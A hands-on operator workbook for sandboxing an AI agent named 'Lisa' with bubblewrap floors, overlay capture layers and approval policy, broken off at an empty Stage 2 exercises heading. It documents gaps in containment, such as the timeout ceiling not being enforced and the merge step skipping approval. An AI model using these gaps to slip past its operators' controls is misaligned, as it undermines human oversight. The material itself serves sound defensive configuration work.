# Sandbox Trust Workbook

A progressive, hands-on guide to controlling **what Lisa can reach and what
Lisa can change**, from a fully contained shell on your own machine all the
way to a trusted fleet of managed nodes.

You do not need a fleet to use this workbook. Start with a single Linux
machine and stop wherever your trust level is met. Each stage builds on the
previous one; the advanced stages (remote nodes, mounted filesystems) only
add machinery you already understand from the early ones.

---

## Contents

- Part I — Foundations
  - [1. The two questions every setting answers](#1-the-two-questions-every-setting-answers)
  - [2. The trust model: floor + tighten-only overrides](#2-the-trust-model-floor--tighten-only-overrides)
  - [3. Read this first: the floor is a ceiling, not a grant](#3-read-this-first-the-floor-is-a-ceiling-not-a-grant)
- Part II — The trust spectrum (the workbook)
  - [Stage 0 — Installation and host prerequisites](#stage-0--installation-and-host-prerequisites)
  - [Stage 1 — Sealed observer: read-only sandbox](#stage-1--sealed-observer-read-only-sandbox)
  - [Stage 2 — Staged changes: the overlay capture layer](#stage-2--staged-changes-the-overlay-capture-layer)
  - [Stage 3 — Real writes to real paths](#stage-3--real-writes-to-real-paths)
  - [Stage 4 — Trusted host: running bare on purpose](#stage-4--trusted-host-running-bare-on-purpose)
  - [Stage 5 — The distributed fleet](#stage-5--the-distributed-fleet)
- Part III — Cross-cutting subjects
  - [SSH from inside the sandbox](#ssh-from-inside-the-sandbox)
  - [Orchestration patterns](#orchestration-patterns)
  - [Verification cookbook](#verification-cookbook)
  - [Operational runbook](#operational-runbook)
  - [Failure modes and troubleshooting](#failure-modes-and-troubleshooting)
- [Appendix: reference material](#appendix-reference-material)

**Suggested reading path.** Everyone reads Part I. Then pick your stage:

- "I just want Lisa on my laptop without it breaking anything" → Stages 0–1.
- "I want to review what Lisa changes before it lands" → Stage 2.
- "Lisa administers this machine directly" → Stage 3 (and read Stage 4 first).
- "Lisa administers my fleet from one box" → Stage 4 first, then Stage 5.

> **How this guide was verified.** Every configuration block, CLI command,
> and file path was read out of the source and then executed against the real
> pack code (`lisa_packs.bwrap.policy`, `bwrap_run`, `bash_run`) to confirm
> behavior — not just transcribed from documentation. The sandbox commands
> were also run live on a real host (openSUSE Tumbleweed, kernel 7.2,
> bubblewrap 0.12.0). Section 3 documents a set of semantics that are
> **surprising and that the pack's own README does not state correctly** — it
> is the most important section in this workbook, and you should read it
> before writing your floors.

---

## Part I — Foundations

## 1. The two questions every setting answers

Every knob in this workbook answers exactly one of two questions. Keeping the
two apart is the single most useful mental model you can carry.

| Question | Answered by | Lives in |
| --- | --- | --- |
| **Where does a command run, and what may it touch?** | The sandbox **floor** (containment) | The session plan: `resources.packs.configuration["lisa-pack-bwrap"]["sandbox"]["floor"]` |
| **Must the operator confirm it first?** | The approval **policy** | `<data_dir>/config/policy.yaml` (default `~/.lisa`) |

Confusing these two is the source of most broken setups. Sandbox and approval
are **independent layers**, and either can exist without the other.

### 1.1 Containment is not approval

**Containment** (the bwrap pack) decides whether the command runs in a
namespace, what filesystem view it gets, and whether its writes are real,
staged, or discarded. It does not *ask* you anything.

**Approval** (the host policy engine) decides whether the operator must
confirm. Its ladder is fixed and short-circuiting:

1. `deny` rules → deny (loud; a tool error the model can reroute on)
2. `ask` rules → prompt
3. `allow` rules → auto-approve
4. **sandbox downgrade** → a sandboxed `execute` action with genuine
   containment auto-approves
5. **mode fallback** → `read` always allows; `plan` denies every effectful
   action; `trust` allows `write`/`execute`; `ask` prompts. The
   bare-execution guard is applied *inside* this step: when `trust` would
   auto-allow an `execute` action that is **not** contained,
   `bare_requires_approval` turns it into a prompt instead.

Two things never ride the approval dial:

- **`external_write` is never auto-approved by the sandbox downgrade.** The
  sandbox is a filesystem/process boundary; an `external_write` (cloud API,
  PR, email) escapes it by definition. It takes an explicit allow rule.
- **Auto-approvals are capped at 10 per turn.** Past the cap, the host
  prompts. A runaway loop surfaces as a prompt rather than burning the
  ledger.

**Containment facts fail closed.** The engine reads a JSON fact the pack
publishes at `<data_dir>/run/<session_key>/sandbox-facts.json`. The recognized
states are `contained`, `degraded`, `none`, `unknown`. Only `contained` counts
as contained; `degraded`, `none`, `unknown`, missing, and malformed all fail
closed to a prompt. An unsandboxed `rm` can never be auto-approved by
mistake.

**The `mode` dial is a fallback, not an override.** `mode: trust` auto-allows
`write`/`execute` — but it does not bypass an explicit `ask` rule, and it
does not auto-allow `external_write`.

The authoring reference for `policy.yaml` — rule matchers, CEL `when`
expressions, the runtime CLI — is the [approval policy guide](POLICY_GUIDE.md);
this workbook stays on the containment side and only touches the policy where
a trust level demands it.

### 1.2 The result stamp: trust it over your assumptions

Every `bash_run` result is stamped with its real posture. Trust the stamp
over your assumptions, and re-check it when it changes between calls.

| Stamp | Meaning |
| --- | --- |
| `sandboxed: false` (no `mode`) | **Unsandboxed** — the bwrap pack is missing or degraded. Changes are permanent and real. |
| `sandboxed: false`, `mode: "bare"` | **Deliberate bare** — your floor *permits* host execution by choice. Not breakage. |
| `backend: "tmpfs"`, `persistence: "ephemeral"` | Ephemeral sandbox. Probing is free; writes are discarded except in `scratch_dir`. |
| `backend: "overlay"` | Captured sandbox. Writes are a *proposal*, not an applied fix. |

The distinction between the first two matters for your incident review:
"bare by policy" and "the sandbox broke" are different failures with
different responses.

### 1.3 The trust spectrum at a glance

The workbook walks this spectrum from left to right:

```text
TIGHTEST                                                            LOOSEST
─────────────────────────────────────────────────────────────────────────────
Stage 1        Stage 2          Stage 3           Stage 4        Stage 5
sealed         overlay          real writes       bare           the fleet
read-only      staged writes    to real paths     trusted host

observing      proposing        changing          being the      changing
                                            the machine      many machines
```

Every stage uses the *same* mechanism — the floor — just with different
values. There is no hidden "yolo" switch; a trusted host is a floor that
says `execution: bare` plus a policy that says `trust`, nothing more.

---

## 2. The trust model: floor + tighten-only overrides

This section is the foundation. Everything else depends on it, and several
details here are counter-intuitive enough that an experienced admin will
otherwise build the wrong mental model.

### 2.1 Floor and request: who can ask for what

Containment is a two-party negotiation, and the direction of the negotiation
is the whole security model.

- **The harness floor** is the *least restrictive* posture you (the human
  operator) will permit. It is authored in the session plan under
  `resources.packs.configuration["lisa-pack-bwrap"]["sandbox"]["floor"]`.
  This channel is **trusted** — it comes from your session file, and model
  tool parameters cannot forge it.
- **The model request** is what the model asks for per call, via the
  `overrides` parameter. It may only **raise integrity**. Asking for anything
  looser than the floor is a hard `PolicyError` that names the axis, the
  attempt, and your floor.

The join is `resolve_effective(floor, request)`: most-restrictive wins on
every axis, and an *explicit* attempt to loosen below the floor is an error
rather than a silent clamp. The error is deliberately loud:

```console
Refused: 'network' cannot be loosened to 'allow' - the harness floor for this
session is 'deny'. Ask the user to raise the floor in the sandbox policy
configuration.
```

**The practical consequence**: a floor with `network: allow` does not *force*
network access, it *permits* it. The model can still tighten per call to
`network: deny`. A floor with `network: deny` makes network access
impossible, and the model cannot talk its way out.

### 2.2 The containment axes

Each axis is ordered independently, loosest to tightest:

| Axis | Order (loosest → tightest) | What it controls |
| --- | --- | --- |
| `execution` | `bare` → `sandbox` | Whether the command runs on the host at all, or in a namespace |
| `persistence` | `direct-write` → `overlay` → `ephemeral` → `readonly` | Where writes go: live, staged in a layer, tmpfs-discarded, or nowhere |
| `network` | `allow` → `deny` | `--unshare-net` or not |
| `device` | `dev` → `minimal` → `none` | Real `/dev`, a synthetic minimal `/dev`, or none |
| `ipc` | `shared` → `unshared` | SysV/POSIX IPC namespace |
| `tmpfs_budget_bytes` | unbounded → finite | Size cap on the writable `/tmp` tmpfs |
| `timeout_ceiling_seconds` | unbounded → finite | Floor can only *lower* the cap |
| `paths` | `rw` < `capture` < `ro` < `hidden` | Per-path visibility and mutability |

Note the `paths` ordering is a *tightness* ordering, not a mutability one:
`rw` is loosest (real writes to the live filesystem), then `capture` (writes
staged into an overlay layer), then `ro` (read-only bind), then `hidden`
(path omitted entirely).

### 2.3 The persistence backends — where writes actually go

This is the axis that most directly answers "can Lisa break my system?", so
it is worth being precise.

**`ephemeral`** (tmpfs backend) — the workspace is bound **read-only at its
real path**, plus a writable host-visible per-session scratch directory at
`<data_dir>/run/<session_key>/scratch`. Everything else is discarded when the
namespace exits. This is the pack default posture.

**`readonly`** — binds *no* writable paths at all. The workspace is
read-only and there is no scratch.

**`overlay`** — writes are captured in a per-target overlayfs `upper` under
`<data_dir>/cache/layers/<layer_id>/targets/<key>/`. The sandbox sees the path
as writable; the live filesystem is untouched until *you* apply the layer.
There is one overlay **per capture target** — the workspace capture root plus
any `capture`-posture path — all sharing the layer id.

**`direct-write`** — the loosest. Real writes to the live filesystem. This
is what `execution: bare` pairs with, and what you want for fully trusted
execution.

### 2.4 The mechanics of the sandbox

The generated bwrap argv is built by `build_bwrap_argv_for_profile` and looks
like this (verified against the real implementation and reproduced live on a
test host):

```text
bwrap
  --unshare-pid --unshare-uts [--unshare-ipc] [--unshare-net]
  --ro-bind / /
  --proc /proc
  --dev /dev                                  # or --dev-bind /dev/null /dev/null
  --tmpfs /tmp [--size <budget>]
  <backend binds>                             # overlay merged views, or scratch
  <floor path binds>                          # --bind / --ro-bind per paths
  [--cap-drop ALL]
  --die-with-parent --new-session
  -- <child argv>
```

For the overlay backend the argv is wrapped in a launcher chain, because
bwrap always drops every capability from its child (`CapEff=0`), so a
child-side `mount(2)` is structurally denied:

```console
unshare --user --map-root-user --mount -- /bin/sh -c '
  mount -t overlay -o userxattr,lowerdir=...,upperdir=...,workdir=... overlay <target>
  ... (one per capture target)
  exec bwrap <isolation argv> --cap-drop ALL -- <child argv>
'
```

The mounts only exist in the launcher's mount-namespace copy. The host's view
of the filesystem is never touched.

### 2.5 The identity artifact — read this before you trust an `ls -l`

Unprivileged bubblewrap can only install a **single-entry uid map**: the
invoking host user maps to sandbox uid 0, and nothing else. Consequences:

- The model runs as **mapped root** inside the sandbox (`uid=0(root)`).
- The model's own files display as `root:root`.
- **Any file owned by a different host uid — including real root's —
  displays as `nobody:nobody`** (overflow uid 65534).

This is a **display artifact of the namespace, not a permissions change**.
On-disk ownership is unchanged. Overlay-captured files land owned by the
real host user outside the sandbox.

The rule that follows, and which the pack enforces in its own model-facing
docs: **never `chown`/`chmod` to "repair" owners inside the sandbox.** In
ephemeral mode the write is discarded; in overlay mode it pollutes the
capture layer with bogus ownership metadata that flows into the merge
proposal.

Confirmed live on a test host:

```text
$ bwrap --ro-bind / / --proc /proc --dev /dev --tmpfs /tmp -- sh -c 'ls -ln /etc/shadow; id'
-rw-rw---- 1 65534 65534 1107 Sep 17 14:23 /etc/shadow
uid=0(root) gid=0(root) groups=0(root),65534(nobody)
```

### 2.6 Containment state is keyed per session

The bash pack keys its sessions by a hash of
`(workspace_id, user_slug, session_plan_digest, surface_id)`. The host
recomputes the same key from the approval identity, so the sandbox-facts JSON
file is the *only* coupling between the pack and the host on this axis. The
host never imports pack code.

**Operational consequence**: changing your session plan changes the digest,
which changes the session key, which changes the fact file. This is why the
pack publishes the fact in a `pre_turn_operation_ids` hook (`sandbox_facts`)
rather than at session creation — the pre-turn hook closes the "gate before
session exists" inversion, so the *very first* approval gate already sees
the true containment state.

---

## 3. Read this first: the floor is a ceiling, not a grant

This section documents behavior verified by executing the real code. It is
the part most likely to waste an afternoon if you assume the intuitive
reading, and **the pack's own README gets two of these wrong**.

### 3.1 The floor's *permissive* scalar values do not take effect by themselves

The containment join is
`resolve_effective(floor, request, defaults=default_posture())`. It starts
from the **most-restrictive of (default, request, floor)** per axis.

The subtlety: for the scalar axes, the ordering is a **tightness** ordering,
and `default_posture()` sits at a particular point in it. When the model
requests nothing, the join is `tighten(default_posture_value, floor_value)` —
and for the permissive floor values, the *default* wins, because the default
is the tighter of the two.

Measured through the real `bwrap_run._effective_profile` (model requests
nothing at all):

| Floor says | Effective value | Result |
| --- | --- | --- |
| `network: allow` | **`deny`** | network is still unshared |
| `network: deny` | `deny` | ✓ as intended |
| `device: dev` | **`minimal`** | still a synthetic `/dev` |
| `device: minimal` | `minimal` | ✓ as intended |
| `device: none` | `none` | ✓ (the one permissive-ish value that sticks) |
| `ipc: shared` | **`unshared`** | IPC still isolated |
| `ipc: unshared` | `unshared` | ✓ as intended |
| `persistence: overlay` | **`ephemeral`** | overlay capture does **not** engage |
| `persistence: direct-write` | **`ephemeral`** | direct writes do **not** happen |
| `persistence: ephemeral` | `ephemeral` | ✓ as intended |
| `persistence: readonly` | `readonly` | ✓ (the other one that sticks) |

**What this means in practice.** The floor is genuinely a *ceiling* on the
model: `network: deny` in the floor **does** prevent the model from getting
network (an explicit `overrides: {network: allow}` is refused with a
`PolicyError`). But writing `network: allow` in the floor does **not** hand
the model network — the model still has to ask for it on the call.

This is not a bug; it is the tightening-only design working as intended. The
model asking for `network: allow` is a *tightening request relative to the
default posture* (the default is `deny`), so it is permitted, and the floor
is consulted only to veto going *looser* than the floor. The floor's `allow`
is a **permission**, not a **grant**.

**The practical consequence for you:** if you want Lisa to have network on
every call, the *model* must pass `overrides: {network: allow}` on each call.
Your floor's job is to *permit* it, and to cap how permissive it can get.

### 3.2 The one axis where the floor genuinely grants: `paths`

`paths` behaves differently, and this is the key to the whole design. The
floor's `paths` map is **not** subject to the same default-posture override,
because `default_posture()` has `paths={}` — there is no default path posture
to tighten against. The floor's path grants are applied directly, and they
*are* effective:

| Floor `paths` | Effective |
| --- | --- |
| `/var/log: ro` | `--ro-bind /var/log /var/log` ✓ |
| `/mnt/data: rw` | `--bind /mnt/data /mnt/data` ✓ (real writes) |
| `/etc: capture` | overlay-captured, **but only under the overlay posture** |

So: **`paths` is where your floor actually grants access; the scalar axes
are where your floor only caps it.**

### 3.3 `capture` in the floor is a trap

`capture` requires the overlay persistence posture. The consistency check
(`_check_capture_consistency`) raises a `PolicyError` when the effective
profile has capture paths but a non-overlay persistence.

Here is the trap: because the floor's `persistence: overlay` does **not**
survive the join with the default posture (§3.1), a floor that pins *both*
`persistence: overlay` **and** a `capture` path produces an effective
persistence of `ephemeral` — and the capture path then makes the whole thing
**loudly fail**.

Verified against the pack's own README example floor, through the real
`bwrap_run` code path:

```console
floor: {execution: sandbox, persistence: overlay, network: deny,
        paths: {/etc: capture, /usr/local/etc: capture, /var/log: ro}}

  plain command (no overrides)    PolicyError: Refused: 'paths[capture]' cannot be
                                  loosened to "capture on ['/etc', '/usr/local/etc']
                                  with persistence 'ephemeral'"
  persist=True                    OK  persistence='overlay'
  overrides persistence=overlay   OK  persistence='overlay'
```

So the README's "Tier 2" floor **fails on any ordinary command** and only
works if the model happens to ask for overlay on that call. This is a
documented-but-untested interaction in the pack; the pack's own test suite
only covers the *request-side* capture path, not a floor-pinned one.

**The fix — and the design this workbook recommends:** **do not put `capture`
in the floor.** Put it in the *model's request*, per call. The floor grants
the `rw`/`ro` surface; the model asks for `capture` on the specific paths it
wants staged, and the request is validated against the floor.

Verified working:

```text
floor: {execution: sandbox, persistence: overlay, network: allow,
        paths: {/var/log: ro, /run/log/journal: ro, /srv/data: rw}}

  plain command                    persistence='ephemeral'  network='deny'
  model requests network           persistence='ephemeral'  network='allow'   ✓
  model requests capture on /etc   persistence='overlay'   paths={/etc: capture, ...}  ✓
  model requests both              persistence='overlay'   network='allow'   ✓
```

The model *can* request `capture` on a path the floor did not name — the
floor's `paths` map constrains the *access level* of paths, and a `capture`
request on an unnamed path is permitted (it is tighter than `rw`, and it
implies overlay). What the floor *does* prevent is the model requesting
`rw` on a path you did not grant `rw` — that is refused:

```console
model requests paths:{/etc: rw}    REFUSED (no explicit rw floor grant)
model requests paths:{/etc: capture}  ALLOWED
```

### 3.4 `persistence: direct-write` in the floor is a genuine grant

Unlike the other scalar axes, `persistence: overlay` in the floor **does**
cap the model: with it pinned, a model request for `direct-write` is
**refused**:

```console
floor: {persistence: overlay, network: allow}
model requests persistence=direct-write  ->  PolicyError: Refused: 'persistence'
                                            cannot be loosened to 'direct-write'
```

Without `persistence` pinned in the floor, that same request is **allowed**
(effective `direct-write`). So pinning `persistence: overlay` in the floor is
worth doing purely as a **ceiling** — it prevents the model from ever
requesting real writes into the sandbox.

### 3.5 The model cannot set `device` or `ipc` at all

`bwrap_run`'s request parser reads only `network`, `persistence`, and
`paths` from `overrides`. `device` and `ipc` are **floor-only** axes.

```text
model requests overrides:{device: dev, ipc: shared}
  -> effective.device = 'minimal'   effective.ipc = 'unshared'   (ignored)
```

This is good news for you: `device` and `ipc` are exactly the two axes where
you want the *harness*, not the model, to decide. Set them in the floor and
the model cannot argue with them.

### 3.6 `timeout_ceiling_seconds` is parsed but not enforced on the run

The floor's `timeout_ceiling_seconds` is parsed, validated, and joined into
the effective profile. But `bwrap_run._run_plan` passes
`params.timeout_seconds` — the **model's** value — straight to
`run_process`. The ceiling is not applied to the actual subprocess timeout.

Verified:

```text
floor ceiling=1800, model requests timeout_seconds=3600
  effective.timeout_ceiling_seconds = 1800
  _run_plan -> run_process(timeout_seconds=params.timeout_seconds)  # 3600
```

So the ceiling constrains the *model's declared* value through the policy
join (a request above the ceiling is a `PolicyError` when the model sets it
explicitly as an override), but it is not a hard kill-switch on the child.
Rely on the `bash_run` side for real timeout control: `timeout_seconds` is
1–300 there, and a foreground timeout **auto-backgrounds** the work as a job
rather than killing it.

### 3.7 The bwrap pack must be selected for bare mode to work at all

This one surprises people. `bash_run` decides its posture from the **bwrap
owner's** floor:

```python
def _floor_requires_sandbox(ctx) -> bool:
    floor = ctx.execution_floor_for("bwrap_run")
    return floor is None or floor.execution != "bare"
```

- Floor says `execution: bare` → bare execution permitted, result stamped
  `sandboxed: false`, `mode: "bare"`.
- **Floor is missing** (no bwrap pack selected, or no
  `providers.capabilities.sandbox`) → `_floor_requires_sandbox` returns
  `True` → the shell **hard-fails** with `SandboxRequiredButUnavailable`.

Verified end-to-end against the real `bash_run.execute`:

```text
CASE 1  no bwrap pack, no floor:
        error: The sandbox floor for this session requires contained execution
               (execution=sandbox), but the sandbox cannot run: ...
        sandboxed: False   mode: None

CASE 2  bwrap pack present, floor execution=bare:
        error: (none)
        sandboxed: False   mode: bare
```

**This inverts the intuitive design.** If you want a host to run bare, you
must **select the bwrap pack** and pin `execution: bare`. Simply *not
installing* the bwrap pack does not give you bare — it gives you a broken
shell, because a missing floor is treated as "not evidence of consent to run
bare" (fail closed).

**Correction to the pack's own README**, which says the opposite — that
"removing the bwrap pack" is the way to get unsandboxed execution. Per the
code above, removing the pack makes the shell *fail*, not run bare. The
README's claim holds only if the bwrap pack is present but broken in a way
that leaves a `bare` floor readable — which is a narrow window.

### 3.8 Summary: what the floor can and cannot do

| You want to… | Set in the floor | Model must also… |
| --- | --- | --- |
| Prevent the model from ever getting network | `network: deny` | nothing — this is refused |
| Allow the model to use network | `network: allow` | request `overrides: {network: allow}` per call |
| Prevent the model from ever writing to the live FS | `persistence: overlay` | nothing — `direct-write` is refused |
| Make the model able to stage writes | `persistence: overlay` | request `overrides: {persistence: overlay}` |
| Let the model write to a specific path for real | `paths: {/path: rw}` | nothing — the bind is emitted |
| Let the model stage writes to a specific path | *(nothing — don't pin capture)* | request `overrides: {paths: {/path: capture}}` |
| Prevent the model from writing to a path | `paths: {/path: ro}` | nothing — `rw` on it is refused |
| Control `/dev` | `device: minimal` | nothing — the model cannot change it |
| Control IPC isolation | `ipc: unshared` | nothing — the model cannot change it |
| Cap the model's timeout | `timeout_ceiling_seconds` | (not enforced on the child — see §3.6) |

---

## Part II — The trust spectrum (the workbook)

Each stage is self-contained: goals, the floor and policy you need, and a
verification step. Later stages reuse earlier configuration, so skipping
ahead works — but read [Section 3](#3-read-this-first-the-floor-is-a-ceiling-not-a-grant)
before you write any floor.

## Stage 0 — Installation and host prerequisites

Everything else assumes this much.

### Kernel and packages

| Requirement | Why | How to check |
| --- | --- | --- |
| `bwrap` (bubblewrap) | The namespace sandbox itself | `bwrap --version` |
| `unshare` (util-linux) | The root-mapped user namespace that performs overlay mounts | `which unshare` |
| Unprivileged user namespaces | The whole isolation mechanism | `sysctl kernel.unprivileged_userns_clone` (Debian/Ubuntu) |
| overlayfs with `userxattr` | The capture layer's upper/lower merge | Kernel ≥ 5.11; test the chain ([verification cookbook](#verification-cookbook)) |
| A local FS for capture targets | overlayfs lower layers must be local | `stat -f -c '%T' <path>` |

Install:

```bash
# openSUSE
sudo zypper install bubblewrap util-linux
# Fedora / RHEL
sudo dnf install bubblewrap util-linux
# Debian / Ubuntu
sudo apt install bubblewrap util-linux
# Arch
sudo pacman -S bubblewrap util-linux
```

Enable unprivileged user namespaces on Debian/Ubuntu:

```bash
sudo sysctl kernel.unprivileged_userns_clone=1
echo 'kernel.unprivileged_userns_clone=1' | sudo tee /etc/sysctl.d/90-userns.conf
```

On newer Ubuntu, AppArmor may restrict unprivileged user namespaces for
unconfined binaries. Check
`/proc/sys/kernel/apparmor_restrict_unprivileged_userns`; if it is `1` and
`bwrap` is not setuid, an AppArmor profile for `bwrap` is the fix.

### Linux only

The bwrap pack is **Linux-only**, and it says so explicitly rather than
failing accidentally. Three kernel features carry the implementation —
bubblewrap, overlayfs with `userxattr`, and `unshare --user --map-root-user
--mount` — and none of them exist on macOS or Windows. The pack's
`check_prerequisites` names the platform boundary on a non-POSIX host.

If the host is not Linux, you have no sandbox from this pack, and an
`execution: sandbox` floor will hard-fail the shell rather than silently
running bare. That is the correct behavior, and it means a non-Linux host
must use `execution: bare` with the `deliberate_bare` posture (Stage 4).

### Python and packs

The packs require Python ≥ 3.11 plus the Lisa harness kernel and SDK. Install
the packs into the Lisa environment:

```bash
# From a checkout of the packs repo
pip install -e ./bash
pip install -e ./bwrap
```

Or, from the session plan, use `auto_install` — note that `auto_install` keys
must also appear in `required`:

```yaml
resources:
  packs:
    required:
      - lisa-pack-bash
      - lisa-pack-bwrap
    auto_install:
      lisa-pack-bwrap:
        source: git+https://github.com/Lisa-Framework/lisa-packs.git@bwrap-v0.1.1
        pin: bwrap-v0.1.1
        editable: false
```

A git `source` must carry a pin (`@tag`, `@branch`, or `@sha`). Local paths
are installed with `uv pip install -e` when `editable: true`.

✅ **Checkpoint:** run the overlay chain test in the
[verification cookbook](#verification-cookbook). If it passes, every later
stage's sandbox mechanics work on this host.

---

## Stage 1 — Sealed observer: read-only sandbox

> *Trust level: Lisa can look at everything on this machine and change
> nothing. This is the out-of-the-box posture — the defaults already do it
> once the pack is selected.*

### 1.1 Goals

- Lisa can read the whole host filesystem, `/proc`, `/sys`, logs, and service
  state — for genuine troubleshooting.
- Writes are impossible by construction.
- No network, no IPC sharing, minimal `/dev` — the tightest defaults.

### 1.2 The configuration

Create `~/.lisa/config/session_context.md` — a session plan is a Markdown
file with YAML front matter (`schema_version: 2`; unknown keys fail
validation). The Markdown body is the primary instruction body and must not
be empty:

```markdown
---
schema_version: 2
name: observer

surface:
  type: personal_dm
  id: my-console
  memory_scope: personal

resources:
  packs:
    required:
      - lisa-pack-bash
      - lisa-pack-bwrap
    include:
      - lisa-pack-bash
      - lisa-pack-bwrap
    configuration:
      lisa-pack-bwrap:
        sandbox:
          floor:
            execution: sandbox
            persistence: readonly
            network: deny
            device: none
            ipc: unshared
            paths:
              /var/log: ro
              /run/log/journal: ro

providers:
  capabilities:
    sandbox: lisa-pack-bwrap

routing:
  start_mode: default

execution:
  max_model_calls: 20
  max_capability_calls: 40
  max_wall_ms: 300000

---

# Observer

You run inside a sealed sandbox. Your job is to observe and diagnose, not to
change anything. Read the posture stamp on every `bash_run` result and obey
it: write attempts will fail, and that is correct, not an error to route
around.

Inside the sandbox you have a read-only view of the whole root filesystem.
You can and should run `journalctl`, `systemctl status`, `ss -tulpn`,
`ip a`, `cat /proc/*`, `dmesg`, and read every log file directly.

When you reach a diagnosis that would require a change, write it up for the
operator to apply — never attempt the change.
```

No approval-policy work is needed: the sandbox downgrade plus the default
policy already auto-approve contained `execute` actions, and `read` actions
always allow. With nothing writable and no network, the residual prompts
are essentially the 10-per-turn cap.

### 1.3 Why each floor axis is set this way

| Axis | Value | Reasoning |
| --- | --- | --- |
| `execution` | `sandbox` | Non-negotiable at this trust level. **This is also the axis that makes the shell work at all** — a missing floor hard-fails the shell (§3.7). |
| `persistence` | `readonly` | One of the two permissive-ish values that *does* survive the join with the default posture (§3.1) — and it emits no writable bind except whatever `paths` grants. |
| `network` | `deny` | `--unshare-net`, and any model request for network is refused outright. |
| `device` | `none` | `--dev-bind /dev/null /dev/null`. No PTY, but a read-only observer does not need one; only the *tight* end of a scalar axis sticks (§3.1). |
| `ipc` | `unshared` | No SysV/POSIX IPC. The model cannot change it (§3.5). |
| `paths` | logs `ro` | The one axis that genuinely *grants* (§3.2) — explicit, per-path inspection surface. |

### 1.4 Verify

```bash
lisa verify
lisa prompt "/shell touch /tmp/probe-from-lisa; echo stamp-check"
```

- Expect `sandboxed: true`. The scratch-dir write is the only write that can
  succeed; a write to a real path fails cleanly.
- Read the stamp: `backend: "tmpfs"`, `persistence: "ephemeral"` or the
  readonly profile; either way, nothing on the live filesystem moved.
- Confirm the fact the host sees: `cat ~/.lisa/run/*/sandbox-facts.json`
  should say `"containment": "contained"`.

#### Exercises

1. Ask Lisa to find why a service failed last night (read journal, unit
   state, config) and write the diagnosis *in chat*, not a file.
2. Ask Lisa to "create a report at `/home/you/report.md`" and watch the
   clean failure — then ask it to put the report in `scratch_dir` and hand
   you the path (this is the correct pattern under an ephemeral posture:
   stage a patch or script under `scratch_dir` and hand it back).

**Where to go next.** When you trust Lisa enough to *propose* changes
instead of only diagnoses, move to Stage 2.

---

## Stage 2 — Staged changes: the overlay capture layer

> *Trust level: Lisa can edit real files inside the sandbox, but nothing
> lands on the live system until you review and apply the diff. This is the
> daily-operations posture for any machine you care about.*

### 2.1 Goals

- Lisa's writes to *system-owned* paths (`/etc`, `/opt/app`, …) are staged
  and reviewable, not silently live.
- Lisa's reads of host state stay wide open.
- A captured change is a *proposal* with an exportable diff and a `layer_id`.

### 2.2 The configuration

Only the floor's persistence and the instruction body change from Stage 1,
and **you must remember §3.3: do not pin `capture` in the floor.**

```yaml
resources:
  packs:
    configuration:
      lisa-pack-bwrap:
        sandbox:
          floor:
            execution: sandbox
            persistence: overlay        # a CEILING: forbids direct-write (§3.4)
            network: deny               # or `allow`; the model must request it per call (§3.1)
            device: minimal             # real /dev + working PTY, floor-only axis (§3.5)
            ipc: unshared
            tmpfs_budget_bytes: 268435456
            paths:
              /var/log: ro
              /run/log/journal: ro
```

`persistence: overlay` in the floor does **not** turn capture on by itself
(§3.1). It caps the model (a `direct-write` request becomes a `PolicyError`),
and the model opts into capture per call. Note `device: minimal`: at Stage 2
you want the model able to spawn PTYs as part of its staging work, and
`minimal` is the tighter of the two values that emit a real `/dev` — only
`none` breaks PTY allocation (see
[§9.2](#92-what-device-does-to-ssh) for the PTY details).

The one approval consideration at this stage: `sandbox_downgrade: true`
(the default) auto-approves the contained `execute` calls, so staging work
is prompt-free. If you would rather keep the default `mode: ask` — so any
not-captured action still prompts — that works too; capture calls still flow
through the downgrade step.

The `tmpfs_budget_bytes` value (256 MiB) overrides the default 64 MiB `/tmp`
cap — it leaves room for `tar`/`rsync`/build staging while still bounding a
runaway writer. This one *does* take effect — it is a budget axis, joined by
`min()`, not by the posture override.

### 2.3 Instruction body — teach the posture and the ask

The model-facing part of the session plan should look like this:

```markdown
## Posture

Your shell runs inside a bubblewrap sandbox. Read the posture stamp on every
`bash_run` result and obey it:

- `backend: "overlay"` — your writes are STAGED in a capture layer, not
  applied. Report the `layer_id` and `captured_paths`. Never claim a staged
  change is merged, applied, or done. The user reviews and applies.
- `backend: "tmpfs"` with `persistence: "ephemeral"` — your writes vanish.
  Stage a patch or script under `scratch_dir` and hand it back.
- `sandboxed: false` with `mode: "bare"` — you are on the real host. Every
  change is permanent. Say so before mutating anything.

## How to ask for what you need

Your sandbox starts in the tightest default posture. The harness floor
permits more, but **permission is not the same as grant** — you must ask for
it on the call, via the `overrides` parameter of `bash_run`:

- Want to stage a change for review instead of writing it live? Ask for the
  overlay posture and name the paths:
  `overrides: {"persistence": "overlay", "paths": {"/etc": "capture"}}`.
  The result then carries `backend: "overlay"` and a `layer_id`.
- Need a looser axis than the floor permits? Relay the error and suggest the
  operator change the policy — do not reword and retry it.

## Ownership inside the sandbox

You run as mapped root via a single-entry uid map. Files owned by other host
uids display as `nobody:nobody` (overflow uid 65534). That is a display
artifact, not an error. Use `ls -n` / `stat -c %u:%g` when ownership
matters. **Never `chown`/`chmod` to "repair" owners inside the sandbox.**
```

### 2.4 Verify

```bash
lisa prompt '/shell stage a change to /etc/hostname and report the layer id'
```

- Expect `backend: "overlay"` and a `layer_id` in the result.
- `cat ~/.lisa/run/layers-exports/<layer_id>/*.diff` shows nothing until you
  export; the live `/etc/hostname` is untouched.
- A plain command with no overrides runs at `persistence: "ephemeral"` —
  correct, per §3.1.

### 2.5 The review-and-apply ritual

Export, read, apply — in that order, and the apply is user-invoked by
design:

1. Lisa stages the change and reports the `layer_id`.
2. Export the layer (the `layers_export` operation); output lands in
   `~/.lisa/run/layers-exports/<layer_id>/` with `<file>.diff`,
   `inventory.json`, and `manifest.json`.
3. **Read the diffs.**
4. Apply via `layers_apply` with the `layer_id`. It mutates the live
   filesystem by design.

**The model must never run the apply on its own initiative.** The pack's own
contract says: "Do not run it on your own initiative; the host surfaces it
after review." Enforce it in the instruction body too.

**Why this gate is procedural, not policy.** `layers_apply` declares
`effect: write` but omits `approval_required` — and the kernel's default for
that field is `false` — so the approval engine is **never consulted** for it.
No `ask` rule in `policy.yaml` can intercept the merge step; the review gate
is the *workflow contract* (model relays the `layer_id`, you review and
invoke the apply), not a policy enforcement. If you want a hard policy gate
on the merge, patch the pack's `layers_apply.yml` to add
`approval_required: true` — as shipped, the human in the loop here is you
following the runbook, not the engine stopping you.

The flip side of the same fact: because `layers_apply` is not approval-gated,
your approval policy being "one-and-done" does not suddenly prompt when *you*
run the apply. It runs immediately, by design, the moment you invoke it.

#### Exercises

